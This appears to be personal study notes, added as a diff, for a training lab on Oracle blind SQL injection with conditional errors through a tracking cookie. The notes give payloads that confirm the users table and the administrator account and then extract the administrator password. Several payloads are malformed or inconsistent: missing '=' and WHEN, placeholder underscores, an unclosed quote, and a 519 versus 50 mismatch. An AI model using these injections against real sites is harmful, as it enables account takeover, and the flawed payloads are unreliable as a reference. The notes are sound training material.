@@ -1,0 +1,47 @@
+SQLi #12 - Blind SQLi with conditional error
+
+Vulnerable parameter - tracking cookies
+
+End goal:
+- Output the administrator password
+- Log in as administrator
+
+Analysis:
+
+1. Prove that the parameter is vulnerable  
+
+' || (select '' from dual) || ' => oracle database
+
+' || (select '' from dualfiewjfow) || ' => error
+
+2. Confirm that hte users table exits in the database
+
+' || (select '' from users) || ' => error => Since it returns more than 1 row, the concatenation cannot be executed
+
+' || (select '' from users where rownum = 1) || ' 
+=> users table exists
+
+3. Confirm that hte administrator user exists in the users table
+
+' || (select '' from users where username = 'administrator') || '
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE _ END from dual) || '
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE _ END from users where username='administrator') || ' 
+- Because FROM clause executes first before the SELECE clause
+-> internal server error => administrator exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE _ END from users where username='fsafsdfadsff') || ' 
+- 200 responses => user does not exists in the database
+
+4. Determine length of password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username'administrator' and LENGTH(password)>519) || '
+
+--> 200 responses at 50 => length of password is less than 50
+--> 20 chars
+
+5. Find the password
+
+' || (select CASE (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator' and SUBSTR(password, 1, 1) = 'a)
+
